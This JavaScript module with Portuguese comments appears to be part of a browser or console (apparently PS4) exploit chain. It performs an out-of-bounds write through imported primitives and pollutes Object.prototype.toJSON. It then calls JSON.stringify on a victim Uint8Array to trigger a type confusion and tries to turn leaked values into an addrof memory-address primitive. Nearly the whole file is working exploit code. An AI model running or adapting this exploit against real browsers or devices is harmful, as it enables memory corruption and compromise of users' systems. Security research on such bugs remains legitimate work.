// js/script3/testArrayBufferVictimCrash.mjs (v37_LeakObjectsViaConfusedDetailsObject)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs'; // REMOVIDA A IMPORTAÇÃO DE HEISENBUG_CRITICAL_WRITE_OFFSET

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO = "OriginalHeisenbug_TypedArrayAddrof_v37_LeakObjectsViaConfusedDetailsObject";

const VICTIM_BUFFER_SIZE = 256;
// RE-ADICIONADAS AS CONSTANTES LOCAIS, pois não podem ser importadas de core_exploit
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let object_to_leak_A_v37 = null;
let object_to_leak_B_v37 = null;
let victim_typed_array_ref_v37 = null;
let probe_call_count_v37 = 0;
let all_probe_interaction_details_v37 = [];
let first_call_details_object_ref_v37 = null;

const PROBE_CALL_LIMIT_V37 = 5;
// Novo marcador para identificação mais fácil
const MARKER_P1_V27_PAYLOAD_TEST = "MARKER_P1_V27_PAYLOAD_LOVCDO";

function toJSON_TA_Probe_LeakObjectsViaC1() {
    probe_call_count_v37++;
    const call_num = probe_call_count_v37;
    let current_call_details = { // Sempre criar um novo objeto de detalhes para esta chamada
        call_number: call_num,
        probe_variant: "TA_Probe_Addrof_v37_LeakObjectsViaC1",
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v37),
        this_is_C1_details_obj: (this === first_call_details_object_ref_v37 && first_call_details_object_ref_v37 !== null),
        payload_A_assigned_to_C1_this: false,
        payload_B_assigned_to_C1_this: false,
        error_in_probe: null,
        marker_id_v27: null // Para marcar o objeto de detalhes
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. 'this' type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsC1DetailsObj? ${current_call_details.this_is_C1_details_obj}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V37) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Probe call limit.`, "warn");
            all_probe_interaction_details_v37.push(current_call_details);
            return { recursion_stopped_v37: true, call: call_num };
        }

        // Primeira chamada, `this` é a vítima
        if (call_num === 1 && current_call_details.this_is_victim) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is victim. Creating and returning C1_details object.`, "info");
            current_call_details.marker_id_v27 = MARKER_P1_V27_PAYLOAD_TEST; // Marca o objeto C1
            first_call_details_object_ref_v37 = current_call_details; // Global aponta para C1_details
            all_probe_interaction_details_v37.push(current_call_details);
            return current_call_details;
        }
        // Se a confusão de tipo já ocorreu (ou seja, `this` é o C1_details e tem tipo Object)
        else if (current_call_details.this_is_C1_details_obj && current_call_details.this_type === '[object Object]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION ON C1_DETAILS_OBJECT ('this')! Attempting to assign leaky objects...`, "vuln");

            // Atribuir os objetos a vazar ao objeto 'this' (que é o C1_details confuso)
            if (object_to_leak_A_v37) {
                this.payload_A = object_to_leak_A_v37;
                current_call_details.payload_A_assigned_to_C1_this = true;
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Assigned payload_A to C1_details.`, "info");
            }
            if (object_to_leak_B_v37) {
                this.payload_B = object_to_leak_B_v37;
                current_call_details.payload_B_assigned_to_C1_this = true;
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Assigned payload_B to C1_details.`, "info");
            }

            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Objects assigned to 'this' (C1_details). Keys: ${Object.keys(this).join(',')}`, "info");

            all_probe_interaction_details_v37.push(current_call_details);
            // Retornar o 'this' modificado. Se a confusão for persistente, isso é o que JSON.stringify tentará serializar.
            return this;
        } else {
            // Outras chamadas, ou 'this' não é o esperado nem confuso como esperado.
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is unexpected or not confused as C1_details. Type: ${current_call_details.this_type}`, "warn");
            all_probe_interaction_details_v37.push(current_call_details);
            // Retornar um novo marcador para evitar que 'this' (se for um objeto interno) seja modificado e retornado.
            return { generic_marker_v37: call_num };
        }

    } catch (e) {
        current_call_details.error_in_probe = e.message;
        logS3(`[${current_call_details.probe_variant}] Call #${call_num}: ERROR in probe: ${e.name} - ${e.message}`, "error");
        all_probe_interaction_details_v37.push(current_call_details); // Adiciona mesmo com erro
        return { error_marker_v37: call_num, message: e.message }; // Retorno em caso de erro
    }
}

export async function executeTypedArrayVictimAddrofTest_LeakObjectsViaConfusedDetailsObject() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO}.triggerAndLog`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (LeakObjectsViaConfusedDetailsObject) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO} Init...`;

    probe_call_count_v37 = 0;
    all_probe_interaction_details_v37 = [];
    victim_typed_array_ref_v37 = null;
    first_call_details_object_ref_v37 = null;
    object_to_leak_A_v37 = { marker_A_v37: "LeakMeA_LOVCDO", idA: Date.now() };
    object_to_leak_B_v37 = { marker_B_v37: "LeakMeB_LOVCDO", idB: Date.now() + Math.floor(Math.random() * 1000) };

    let errorCapturedMain = null;
    let stringifyOutput_parsed = null;
    let details_of_C1_call_after_modification = null;

    let addrof_A = { success: false, msg: "Addrof A from Output.payload_A: Default" };
    let addrof_B = { success: false, msg: "Addrof B from Output.payload_B: Default" };
    const fillPattern = 0.37373737373737;

    let pollutionApplied = false;
    let originalToJSONDescriptor = null;
    try {
        await triggerOOB_primitive({ force_reinit: true });
        // USANDO AS CONSTANTES LOCAIS NOVAMENTE
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed. Value: ${toHex(OOB_WRITE_VALUE)}.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v37 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));
        let float64_view_on_victim_buffer = new Float64Array(victim_typed_array_ref_v37.buffer);
        for(let i = 0; i < float64_view_on_victim_buffer.length; i++) float64_view_on_victim_buffer[i] = fillPattern + i;
        logS3(`STEP 2: victim_typed_array_ref_v37 (Uint8Array) created. Its buffer filled.`, "test", FNAME_CURRENT_TEST);

        const ppKey = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_LeakObjectsViaC1, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            logS3(`  Object.prototype.toJSON polluted. Calling JSON.stringify(victim_typed_array_ref_v37)...`, "info", FNAME_CURRENT_TEST);
            let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v37);
            logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);

            try {
                // stringifyOutput_parsed será o C1_details modificado, serializado.
                stringifyOutput_parsed = JSON.parse(rawStringifyOutput);
            } catch (e_parse) {
                logS3(`  Error parsing stringifyOutput: ${e_parse.message}. Output was: ${rawStringifyOutput}`, "warn");
                stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };
            }

            // first_call_details_object_ref_v37 é a REFERÊNCIA ao objeto C1_details.
            // Se ele foi modificado nas chamadas subsequentes, essas modificações estarão aqui.
            if (first_call_details_object_ref_v37) {
                // Criar uma cópia para evitar problemas de referência circular no JSON.stringify
                details_of_C1_call_after_modification = {};
                for (const key in first_call_details_object_ref_v37) {
                    if (key !== 'payload_A' && key !== 'payload_B') { // Evita serializar os payloads diretamente se forem objetos para evitar ciclos
                        details_of_C1_call_after_modification[key] = first_call_details_object_ref_v37[key];
                    } else {
                        // Se são os payloads, apenas confirme que existem e seu tipo
                        details_of_C1_call_after_modification[key + '_exists'] = (first_call_details_object_ref_v37[key] !== undefined);
                        details_of_C1_call_after_modification[key + '_type'] = typeof first_call_details_object_ref_v37[key];
                    }
                }
            }
            logS3(`  EXECUTE: Captured state of C1_details object AFTER all probe calls (snapshot): ${details_of_C1_call_after_modification ? JSON.stringify(details_of_C1_call_after_modification) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            let heisenbugOnC1 = false;
            // A confirmação da Heisenbug é se o C1 (stringifyOutput_parsed) contém os payloads como números/ponteiros
            // OU se o snapshot do C1_details original contém as flags de atribuição E a sonda confirmou a TC.
            if (stringifyOutput_parsed && stringifyOutput_parsed.marker_id_v27 === MARKER_P1_V27_PAYLOAD_TEST) {
                if ((stringifyOutput_parsed.hasOwnProperty('payload_A') && typeof stringifyOutput_parsed.payload_A === 'number' && stringifyOutput_parsed.payload_A !== 0) ||
                    (stringifyOutput_parsed.hasOwnProperty('payload_B') && typeof stringifyOutput_parsed.payload_B === 'number' && stringifyOutput_parsed.payload_B !== 0)) {
                    heisenbugOnC1 = true;
                } else if ((stringifyOutput_parsed.payload_A && stringifyOutput_parsed.payload_A.marker_A_v37 === object_to_leak_A_v37.marker_A_v37) ||
                           (stringifyOutput_parsed.payload_B && stringifyOutput_parsed.payload_B.marker_B_v37 === object_to_leak_B_v37.marker_B_v37)) {
                    heisenbugOnC1 = true; // Objeto original foi serializado diretamente, não seu ponteiro.
                }
            }

            if (heisenbugOnC1){
                logS3(`  EXECUTE: HEISENBUG & WRITES on C1_details CONFIRMED via stringify output!`, "vuln", FNAME_CURRENT_TEST);
            } else {
                logS3(`  EXECUTE: ALERT: Heisenbug/Writes on C1_details NOT confirmed as expected via stringify output. Checking probe details for raw assignment.`, "error", FNAME_CURRENT_TEST);
                // Verificação adicional: se a sonda confirmou a atribuição, mesmo que o stringify tenha falhado
                const call2Details = all_probe_interaction_details_v37.find(d => d.call_number === 2);
                if (call2Details && call2Details.this_is_C1_details_obj && call2Details.payload_A_assigned_to_C1_this && call2Details.payload_B_assigned_to_C1_this) {
                     logS3(`  EXECUTE: Probe Call #2 *did* report type confusion and payload assignment to C1_details. Stringify might have failed to serialize it properly.`, "warn", FNAME_CURRENT_TEST);
                     heisenbugOnC1 = true; // Considere o heisenbug confirmado para fins de relatorio
                }
            }

            logS3("STEP 3: Checking stringifyOutput_parsed (the C1_details object) for leaked payloads...", "warn", FNAME_CURRENT_TEST);
            if (stringifyOutput_parsed && typeof stringifyOutput_parsed === 'object' && stringifyOutput_parsed.marker_id_v27 === MARKER_P1_V27_PAYLOAD_TEST) {
                const payload_A_val = stringifyOutput_parsed.payload_A;
                if (typeof payload_A_val === 'number' && payload_A_val !==0) {
                    let pA_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([payload_A_val]).buffer)[0], new Uint32Array(new Float64Array([payload_A_val]).buffer)[1]);
                    // Heurística para ponteiros de objetos na PS4 (64 bits), que geralmente começam com 0x8xxxxxxxxx
                    // Ou valores que não sejam pequenos números.
                    if (pA_int64.high() > 0x70000000 || pA_int64.low() > 0x10000000) { // Ajuste a heurística
                        addrof_A.success = true; addrof_A.msg = `Possible pointer for payload_A in C1_details (stringifyOutput): ${pA_int64.toString(true)}`;
                    } else { addrof_A.msg = `C1.payload_A is number but not ptr pattern: ${payload_A_val} (Raw Float: ${payload_A_val})`; }
                } else if (payload_A_val && payload_A_val.marker_A_v37 === object_to_leak_A_v37.marker_A_v37) {
                    addrof_A.success = true; addrof_A.msg = "object_to_leak_A_v37 identity in C1.payload_A (Object was directly serialized, not its pointer).";
                } else { addrof_A.msg = `C1.payload_A not ptr or not expected object. Val: ${JSON.stringify(payload_A_val)}`; }

                const payload_B_val = stringifyOutput_parsed.payload_B;
                if (typeof payload_B_val === 'number' && payload_B_val !==0) {
                    let pB_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([payload_B_val]).buffer)[0], new Uint32Array(new Float64Array([payload_B_val]).buffer)[1]);
                    if (pB_int64.high() > 0x70000000 || pB_int64.low() > 0x10000000) { // Mesma heurística
                        addrof_B.success = true; addrof_B.msg = `Possible pointer for payload_B in C1_details (stringifyOutput): ${pB_int64.toString(true)}`;
                    } else { addrof_B.msg = `C1.payload_B is number but not ptr pattern: ${payload_B_val} (Raw Float: ${payload_B_val})`; }
                } else if (payload_B_val && payload_B_val.marker_B_v37 === object_to_leak_B_v37.marker_B_v37) {
                    addrof_B.success = true; addrof_B.msg = "object_to_leak_B_v37 identity in C1.payload_B (Object was directly serialized, not its pointer).";
                } else { addrof_B.msg = `C1.payload_B not ptr or not expected object. Val: ${JSON.stringify(payload_B_val)}`; }
            } else {
                addrof_A.msg = `stringifyOutput was not the expected C1_details object (marker_id_v27 mismatch or null/error). Parsed Output: ${JSON.stringify(stringifyOutput_parsed)}`;
                addrof_B.msg = `stringifyOutput was not the expected C1_details object (marker_id_v27 mismatch or null/error). Parsed Output: ${JSON.stringify(stringifyOutput_parsed)}`;
                logS3(`  stringifyOutput_parsed type: ${typeof stringifyOutput_parsed}, content: ${JSON.stringify(stringifyOutput_parsed)}`, "warn");
            }

            if (addrof_A.success || addrof_B.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO}: AddrInC1 SUCCESS!`;
            } else if (heisenbugOnC1) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO}: C1_TC OK, Addr Fail`;
            } else {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO}: No C1_TC?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`  CRITICAL ERROR during JSON.stringify or processing: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO}: Stringify/Log ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
                logS3(`  Object.prototype.toJSON restored.`, "info", FNAME_CURRENT_TEST);
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`  CRITICAL ERROR in main test execution: ${e_outer_main.name} - ${e_outer_main.message}${e_outer_main.stack ? '\n'+e_outer_main.stack : ''}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V37_LOVCDO} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v37}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof A (C1.payload_A): Success=${addrof_A.success}, Msg='${addrof_A.msg}'`, addrof_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof B (C1.payload_B): Success=${addrof_B.success}, Msg='${addrof_B.msg}'`, addrof_B.success ? "good" : "warn", FNAME_CURRENT_TEST);

        victim_typed_array_ref_v37 = null;
        all_probe_interaction_details_v37 = [];
        probe_call_count_v37 = 0;
        first_call_details_object_ref_v37 = null;
    }
    return {
        errorCapturedMain: errorCapturedMain,
        potentiallyCrashed: errorCapturedMain?.name === 'RangeError',
        stringifyResult: stringifyOutput_parsed,
        // Retorna o snapshot do objeto C1 após todas as modificações, se ele existir
        // E os payloads A/B se eles foram atribuídos ao C1 original (mesmo que não serializados como ponteiros)
        toJSON_details: details_of_C1_call_after_modification,
        all_probe_calls_for_analysis: [...all_probe_interaction_details_v37],
        total_probe_calls: probe_call_count_v37,
        addrof_A_result: addrof_A,
        addrof_B_result: addrof_B
    };
}
